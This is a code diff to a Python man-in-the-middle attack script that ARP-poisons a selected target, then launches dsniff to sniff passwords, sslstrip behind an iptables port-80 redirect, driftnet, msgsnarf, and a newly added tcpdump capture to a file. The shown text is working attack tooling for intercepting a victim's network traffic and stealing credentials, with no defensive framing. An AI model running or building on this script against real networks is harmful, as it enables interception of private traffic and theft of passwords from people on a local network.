@@ -112,6 +112,20 @@ def arppoison(iface, target, gwaddr):
     print("[+] Poisoning them bastards")
     os.popen("arpspoof -i " + iface + " -t " + gwaddr + target + "  & >/dev/null")
 
+# Function: tcpdump
+def tcpdumper(iface):
+    choose = raw_input("[?] Launch TCPDump to sniff raw data to a file? (y/n) ")
+    if choose == "n":
+        print("[+] TCPdump not launched!")
+        pass
+    elif choose == "y":
+        try:
+            print("[+] Launching TCPDump in background!")
+            os.popen("xterm -e tcpdump -i " + iface + " -w output.cap &")
+        except Exception:
+            print("Something Broke!")
+            sys.exit(1)
+
 # Function: Dsniff
 def launch_dsniff(iface):
     choose = raw_input("[?] Launch DSNIFF to sniff passwords? (y/n) ")
@@ -179,7 +193,7 @@ def launch_sslstrip():
             print("[+] Setting IPTables NAT rulesets")
             subprocess.call('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', shell=True)
             print("[+] Launching SSLStrip in background!")
-            os.popen("xterm -e sslstrip -a &")
+            os.popen("xterm -e sslstrip -l 10000 -a &")
         except Exception:
             print("Something Broke!")
             sys.exit(1)
@@ -201,6 +215,7 @@ print(arping(scanrange)) # should be a far faster scanner. If it breaks just unc
 #arpscan(scanrange)
 target = raw_input("Please Select a Target: ")
 arppoison(iface, target, gwaddr)
+tcpdumper(iface)
 launch_dsniff(iface)
 launch_driftnet(iface)
 launch_msgsnarf(iface)
